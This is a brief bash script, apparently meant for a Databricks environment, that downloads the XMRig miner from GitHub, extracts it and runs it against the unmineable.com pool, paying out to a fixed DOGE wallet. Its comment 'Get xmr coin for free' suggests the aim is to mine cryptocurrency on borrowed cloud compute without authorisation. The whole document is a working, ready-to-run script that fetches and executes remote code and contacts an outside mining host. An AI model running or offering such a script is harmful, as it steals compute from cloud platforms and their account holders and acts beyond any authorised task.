#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
tar xvzf xmrig-6.16.4-focal-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o rx.unmineable.com:3333 -a rx -k -t 3 -u DOGE:DJqKJPTQv7y3DYcLQeJMXdzPDiBfE37ncT.worker1
